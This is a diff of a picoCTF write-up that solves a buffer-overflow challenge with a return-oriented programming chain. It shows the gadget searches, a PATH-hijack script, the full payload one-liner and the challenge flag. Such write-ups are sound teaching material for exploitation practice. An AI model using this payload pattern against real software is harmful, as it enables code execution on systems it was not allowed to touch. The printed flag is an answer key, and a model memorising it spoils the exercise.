@@ -2,7 +2,7 @@
 
 >Can you exploit the following program to get a flag?
 >You may need to think return-oriented if you want to program your way to the flag.
->You can find the program in /problems/can-you-gets-me_1_e66172cf5b6d25fffee62caf02c24c3d on the shell server. Source. 
+>You can find the program in /problems/can-you-gets-me_1_e66172cf5b6d25fffee62caf02c24c3d on the shell server. Source.
 
 ### [~$ cd ..](../)
 
@@ -57,7 +57,7 @@ The man idea is to execute something like `execve("/bin/sh", NULL, NULL)`. To su
 * `$eax=0xb`, 0xb begin the syscall code we expect
 * `$ebx` contains the address of "/bin/sh"
 * `$ecx=NULL` the arguments to pass to the command (don't care)
-* `$edx=NULL` the address of the envionment variables (don't care)
+* `$edx=NULL` the address of the environment variables (don't care)
 
 To obtain the expected setting, we will push the values onto the stack and then pop them into registers. The outline of the payload is therefore:
 
@@ -83,7 +83,7 @@ and to use a constant string in `rodata`:
 >% readelf -x .rodata ./gets|head -n 20
 >
 >Vidange hexadécimale de la section « .rodata » :
->0x080bb320 03000000 01000200 47495645 204d4520 ........GIVE ME 
+>0x080bb320 03000000 01000200 47495645 204d4520 ........GIVE ME
 >0x080bb330 594f5552 204e414d 4521002e 2e2f6373 YOUR NAME!.../cs
 >0x080bb340 752f6c69 62632d73 74617274 2e630046 u/libc-start.c.F
 >0x080bb350 4154414c 3a206b65 726e656c 20746f6f ATAL: kernel too
@@ -91,24 +91,24 @@ and to use a constant string in `rodata`:
 >0x080bb370 74617274 2e655f70 68656e74 73697a65 tart.e_phentsize
 >0x080bb380 203d3d20 73697a65 6f66202a 474c2864  == sizeof *GL(d
 >0x080bb390 6c5f7068 64722900 46415441 4c3a2063 l_phdr).FATAL: c
->0x080bb3a0 616e6e6f 74206465 7465726d 696e6520 annot determine 
+>0x080bb3a0 616e6e6f 74206465 7465726d 696e6520 annot determine
 >0x080bb3b0 6b65726e 656c2076 65727369 6f6e0a00 kernel version..
 >0x080bb3c0 756e6578 70656374 65642072 656c6f63 unexpected reloc
->0x080bb3d0 20747970 6520696e 20737461 74696320  type in static 
+>0x080bb3d0 20747970 6520696e 20737461 74696320  type in static
 >0x080bb3e0 62696e61 72790000 67656e65 7269635f binary..generic_
 >0x080bb3f0 73746172 745f6d61 696e002f 6465762f start_main./dev/
 >0x080bb400 66756c6c 002f6465 762f6e75 6c6c0000 full./dev/null..
->0x080bb410 7365745f 74687265 61645f61 72656120 set_thread_area 
+>0x080bb410 7365745f 74687265 61645f61 72656120 set_thread_area
 >0x080bb420 6661696c 65642077 68656e20 73657474 failed when sett
 >0x080bb430 696e6720 75702074 68726561 642d6c6f ing up thread-lo
 > ```
 
-It's important here to choose a string ending with a null byte. We choosed here the string "ull" located at `0x080bb40b`. We then had to create
+It's important here to choose a string ending with a null byte. We choose here the string "ull" located at `0x080bb40b`. We then had to create
 a script named "ull" executing the expected command (i.e `cat` the flag)
 
 ## Find gadgets
 
-We then used to program `rp-lin-x86` to find the expected gadgets:
+We then used the program `rp-lin-x86` to find the expected gadgets:
 
 > ```sh
 >% ./rop86 --file gets -r 1 --unique|grep "pop eax"
@@ -120,7 +120,7 @@ We then used to program `rp-lin-x86` to find the expected gadgets:
 Gadget `pop $eax`: **0x080b81c6**
 
 > ```sh
->% ./rop86 --file gets -r 1 --unique|grep "pop ebx" 
+>% ./rop86 --file gets -r 1 --unique|grep "pop ebx"
 >0x080505a3: pop ebx ; jmp eax ;  (6 found)
 >0x0804cec7: pop ebx ; rep ret  ;  (1 found)
 >0x080481c9: pop ebx ; ret  ;  (181 found)
@@ -130,14 +130,14 @@ Gadget `pop $eax`: **0x080b81c6**
 Gadget `pop $ebx`: **0x080481c9**
 
 > ```sh
->% ./rop86 --file gets -r 1 --unique|grep "pop ecx" 
+>% ./rop86 --file gets -r 1 --unique|grep "pop ecx"
 >0x080de955: pop ecx ; ret  ;  (1 found)
 > ```
 
 Gadget `pop $ecx`: **0x080de955**
 
 > ```sh
->% ./rop86 --file gets -r 1 --unique|grep "pop edx" 
+>% ./rop86 --file gets -r 1 --unique|grep "pop edx"
 >0x0806f02a: pop edx ; ret  ;  (2 found)
 > ```
 
@@ -203,14 +203,14 @@ Perfect!
 
 Since the command "ull" is not a regular command we need to create it:
 
-> ```
->% cd /tmp
->% nano ull
->	#!/bin/sh
+```bash
+% cd /tmp
+% nano ull
+	#!/bin/sh
 	cat /problems/can-you-gets-me_1_e66172cf5b6d25fffee62caf02c24c3d/flag.txt
->% chmod +x ull
->% export PATH=/tmp:$PATH
->% python -c "print 'A' * 28 + '\xc6\x81\x0b\x08\x0b\x00\x00\x00\xc9\x81\x04\x08\x0b\xb4\x0b\x08\x55\xe9\x0d\x08\x00\x00\x00\x00\x2a\xf0\x06\x08\x00\x00\x00\x00\x30\xf6\x06\x08'" | /problems/can-you-gets-me_1_e66172cf5b6d25fffee62caf02c24c3d/gets>
-> ```
+% chmod +x ull
+% export PATH=/tmp:$PATH
+% python -c "print 'A' * 28 + '\xc6\x81\x0b\x08\x0b\x00\x00\x00\xc9\x81\x04\x08\x0b\xb4\x0b\x08\x55\xe9\x0d\x08\x00\x00\x00\x00\x2a\xf0\x06\x08\x00\x00\x00\x00\x30\xf6\x06\x08'" | /problems/can-you-gets-me_1_e66172cf5b6d25fffee62caf02c24c3d/gets
+```
 
 FLAG: **picoCTF{rOp_yOuR_wAY_tO_AnTHinG_700e9c8e}**
